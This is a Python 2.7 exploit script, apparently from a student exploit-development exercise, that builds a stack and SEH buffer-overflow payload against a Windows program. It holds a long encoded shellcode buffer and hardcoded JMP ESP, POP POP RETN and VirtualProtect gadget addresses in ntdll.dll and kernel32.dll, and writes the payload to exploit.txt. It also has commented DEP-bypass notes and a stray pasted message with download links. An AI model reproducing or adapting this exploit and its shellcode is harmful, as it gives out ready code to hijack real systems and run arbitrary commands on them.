#Exploit in python 2.7
from struct import pack

#Turn off sehop - https://samsclass.info/127/proj/p15-seha.htm

buf =  b""
buf += b"\xdb\xc4\xbb\x5d\x49\x2a\x02\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x52\x31\x58\x17\x83\xe8\xfc\x03\x05\x5a\xc8"
buf += b"\xf7\x49\xb4\x8e\xf8\xb1\x45\xef\x71\x54\x74\x2f\xe5"
buf += b"\x1d\x27\x9f\x6d\x73\xc4\x54\x23\x67\x5f\x18\xec\x88"
buf += b"\xe8\x97\xca\xa7\xe9\x84\x2f\xa6\x69\xd7\x63\x08\x53"
buf += b"\x18\x76\x49\x94\x45\x7b\x1b\x4d\x01\x2e\x8b\xfa\x5f"
buf += b"\xf3\x20\xb0\x4e\x73\xd5\x01\x70\x52\x48\x19\x2b\x74"
buf += b"\x6b\xce\x47\x3d\x73\x13\x6d\xf7\x08\xe7\x19\x06\xd8"
buf += b"\x39\xe1\xa5\x25\xf6\x10\xb7\x62\x31\xcb\xc2\x9a\x41"
buf += b"\x76\xd5\x59\x3b\xac\x50\x79\x9b\x27\xc2\xa5\x1d\xeb"
buf += b"\x95\x2e\x11\x40\xd1\x68\x36\x57\x36\x03\x42\xdc\xb9"
buf += b"\xc3\xc2\xa6\x9d\xc7\x8f\x7d\xbf\x5e\x6a\xd3\xc0\x80"
buf += b"\xd5\x8c\x64\xcb\xf8\xd9\x14\x96\x94\x2e\x15\x28\x65"
buf += b"\x39\x2e\x5b\x57\xe6\x84\xf3\xdb\x6f\x03\x04\x1b\x5a"
buf += b"\xf3\x9a\xe2\x65\x04\xb3\x20\x31\x54\xab\x81\x3a\x3f"
buf += b"\x2b\x2d\xef\x90\x7b\x81\x40\x51\x2b\x61\x31\x39\x21"
buf += b"\x6e\x6e\x59\x4a\xa4\x07\xf0\xb1\x2f\xe8\xad\xb8\xda"
buf += b"\x80\xaf\xba\x25\xea\x39\x5c\x4f\x1c\x6c\xf7\xf8\x85"
buf += b"\x35\x83\x99\x4a\xe0\xee\x9a\xc1\x07\x0f\x54\x22\x6d"
buf += b"\x03\x01\xc2\x38\x79\x84\xdd\x96\x15\x4a\x4f\x7d\xe5"
buf += b"\x05\x6c\x2a\xb2\x42\x42\x23\x56\x7f\xfd\x9d\x44\x82"
buf += b"\x9b\xe6\xcc\x59\x58\xe8\xcd\x2c\xe4\xce\xdd\xe8\xe5"
buf += b"\x4a\x89\xa4\xb3\x04\x67\x03\x6a\xe7\xd1\xdd\xc1\xa1"
buf += b"\xb5\x98\x29\x72\xc3\xa4\x67\x04\x2b\x14\xde\x51\x54"
buf += b"\x99\xb6\x55\x2d\xc7\x26\x99\xe4\x43\x56\xd0\xa4\xe2"
buf += b"\xff\xbd\x3d\xb7\x9d\x3d\xe8\xf4\x9b\xbd\x18\x85\x5f"
buf += b"\xdd\x69\x80\x24\x59\x82\xf8\x35\x0c\xa4\xaf\x36\x05"
print("shellcode length = {}".format(len(buf)))

#RETN Address: 0x77ec1053 in ntdll.dll
#JMP ESP Address: 0x77f1e871 in ntdll.dll
#pushad # retn = 0x77ec1052 in kernel32.dll
#virtual protect address: 0x77E22341 in kernel32.dll
jmp_esp = pack("l", 0x77f1e871)
retn = pack("l", 0x77ec1053)
virtual_protect = pack("l", 0x77e22341)
push_ad = pack("l", 0x77ec1052)
junk1 = (1340-1032-4)*"Z"
nop = "\x90" * 8
junk2 = "Z" * 100
retn_shellcode_address = pack("l", 0x01010101) #pointer to my shellcode... esp? Use PUSHAD
lpAddress = pack("l", 0x01010101) #pointer to my shellcode... esp? Use PUSHAD
shellcode_size = 'xxxx' #size of my shellcode...? 800 sounds good enough. 351+100 pre nops.
fl_new_protect = 'xxxx' #0x40 or 0x20?
fl_old_protect = 'xxxx' #Find Writable Address  
args = lpAddress + shellcode_size + fl_new_protect + fl_old_protect
shellcode = buf #351 long shellcode
pop_pop_retn = pack("l", 0x77ede28d)
jmp_short_bytecode =  "\x08\xE9\x90\x90" #Need to make this bytecode for jmp short / jmp 4bytes / jmp 6 bytes

# junk0 = "A"*1032
# #A * 1012 == Just before EIP 
# #A * 1340 == SEH record
# eip = "DDDD"
# junk1 = (1340-1032-4)*"Z"
junk0 = "A" * 1012
pointer_to_seh_handler =  jmp_short_bytecode
# pointer_to_seh_handler =  "BBBB"
# se_handler = "CCCC" #Need to make this pointer to pop pop retn #EIP
se_handler = pop_pop_retn

f = open("exploit.txt", "w")
# payload = junk0 + eip + junk1 + pointer_to_seh_handler + se_handler + virtual_protect + retn_shellcode_address + args + nop + shellcode + junk2
# payload = junk0 + retn + virtual_protect + retn_shellcode_address + args # + nop + shellcode + junk2
payload = junk0 + jmp_esp + nop + shellcode + "\x01" * 2 # + retn_shellcode_address + args # + nop + shellcode + junk2
f.write(payload)
f.close()
print("exploit.txt created. Length: {}".format(len(payload)))

# common bad characters are:

#     00 for NULL
#     0A for Line Feed n
#     0D for Carriage Return r
#     FF for Form Feed f


# VirtualProtect
# # # Calling VirtualProtect with parameters
# parameters = struct.pack('<L', 0x77e22e15)    # kernel32.VirtualProtect()
# parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
# parameters += struct.pack('<L', 0x45454545)    # lpAddress
# parameters += struct.pack('<L', 0x03030303)    # size of shellcode
# parameters += struct.pack('<L', 0x54545454)    # flNewProtect
# parameters += struct.pack('<L', 0x62506060)    # pOldProtect (any writeable address)


# PUSHAD output
# EDI
# ESI
# EBP
# Pointer to the stack (automatic)
# EBX
# EDX
# ECX
# EAX


# VirtualProtect PUSHAD output Requirement
# EDI
# ESI
# EBP
# Pointer to the stack (automatic)
# EBX
# EDX
# ECX
# EAX

# Justin,

# You could try the below link for Microsoft Visual Studio 2008 Express Edition
# https://download.microsoft.com/download/8/B/5/8B5804AD-4990-40D0-A6AA-CE894CBBB3DC/VS2008ExpressENUX1397868.iso

# Then because it is a .iso file you need a way of mounting it.
# I used WinCDEmu
# https://github-releases.githubusercontent.com/36779968/ad433180-20a7-11e9-9a2a-544a6987b52c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210913%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210913T103327Z&X-Amz-Expires=300&X-Amz-Signature=3066e53680c77934d2bd7b54753b1bff053a3f09fa82012cd2f751e9499fe896&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=36779968&response-content-disposition=attachment%3B%20filename%3DWinCDEmu-4.1.exe&response-content-type=application%2Foctet-stream